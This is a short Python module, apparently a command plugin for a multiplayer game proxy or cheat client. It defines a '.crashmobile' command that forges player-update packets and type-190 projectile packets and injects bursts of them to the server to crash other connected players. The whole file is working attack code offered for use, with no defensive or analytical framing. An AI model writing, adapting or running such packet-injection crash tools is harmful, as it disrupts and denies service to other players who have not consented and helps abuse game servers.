
import asyncio
import struct
from .registry import command
from .context import COLOR_ERR, COLOR_SUC, COLOR_INF

def build_fake_player_update(player_id: int, x: float, y: float, channel_active: bool) -> bytes:
    control = 32 if channel_active else 0
    payload = struct.pack('<BBBBffff', player_id, control, 0, 0, x, y, 0.0, 0.0)
    body = bytes([13]) + payload
    return struct.pack('<H', len(body) + 2) + body

def build_projectile_190(proj_id: int, owner_id: int, x: float, y: float) -> bytes:
    flags = 0x02
    payload = struct.pack('<hffffBhB', proj_id, x, y, 3.0, 3.0, owner_id, 190, flags)
    payload += struct.pack('<f', 0.2)
    body = bytes([27]) + payload
    return struct.pack('<H', len(body) + 2) + body

async def execute_crash_burst(ctx):
    player_id = ctx.state.my_slot
    if player_id == -1:
        return

    local_player = ctx.state.players.get(player_id)
    if not local_player:
        return

    x, y = local_player.x, local_player.y

    targets = [p for p in ctx.state.players.values() if p.active and p.id != player_id]

    print(f"\n[crashmobile] running type-190 attack against {len(targets)} players...")

    proj_id_counter = 1000

    for target in targets:
        if not getattr(ctx.state, 'connected', True):
            break

        for _ in range(3):
            batch = bytearray()
            batch.extend(build_fake_player_update(player_id, x, y, channel_active=True))
            batch.extend(build_projectile_190(proj_id_counter, player_id, x, y))
            proj_id_counter += 1
            await ctx.inject_server(bytes(batch))
            await asyncio.sleep(0.01)

    final_sync = build_fake_player_update(player_id, x, y, channel_active=False)
    await ctx.inject_server(final_sync)

    print("[crashmobile] sequence complete.")
    if getattr(ctx.state, 'connected', True):
        await ctx.reply("crashmobile attack executed.", COLOR_INF)

@command(".crashmobile")
async def cmd_crashmobile(ctx, line, parts):
    await ctx.reply("generating channeled projectile 190 burst...", COLOR_SUC)
    asyncio.create_task(execute_crash_burst(ctx))